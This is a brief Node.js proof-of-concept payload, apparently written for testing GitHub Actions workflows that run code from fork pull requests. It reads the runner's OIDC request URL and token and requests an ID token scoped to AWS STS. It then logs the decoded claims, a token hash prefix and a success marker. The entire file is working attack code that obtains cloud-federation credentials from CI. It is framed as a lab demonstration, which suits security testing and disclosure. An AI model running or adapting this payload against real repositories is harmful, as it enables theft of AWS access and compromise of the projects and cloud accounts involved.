// Harmless lab payload: prints the OIDC token claims available to a fork PR's code.
const https=require('https'), crypto=require('crypto');
const M='LABPRT-POC-5c2e77';
const url=process.env.ACTIONS_ID_TOKEN_REQUEST_URL, tok=process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
console.log(`${M} start url=${!!url} token=${!!tok} event=${process.env.GITHUB_EVENT_NAME} repo=${process.env.GITHUB_REPOSITORY}`);
const req=https.request(`${url}&audience=sts.amazonaws.com`,{headers:{Authorization:`bearer ${tok}`}},res=>{
  let d='';res.on('data',c=>d+=c);res.on('end',()=>{
    try{const t=JSON.parse(d).value;const [h,p]=t.split('.');
      console.log(`${M} oidc_status=${res.statusCode}`);
      console.log(`${M} oidc_claims=${Buffer.from(p,'base64url').toString()}`);
      console.log(`${M} token_sha256_16=${crypto.createHash('sha256').update(t).digest('hex').slice(0,16)}`);
      console.log(`${M} RESULT=FORK_PR_CODE_EXECUTION_OK`);
    }catch(e){console.log(`${M} parse_fail=${e.message}`)}
    process.exit(0);
  });
});
req.on('error',e=>{console.log(`${M} err=${e.message}`);process.exit(0)});
req.end();
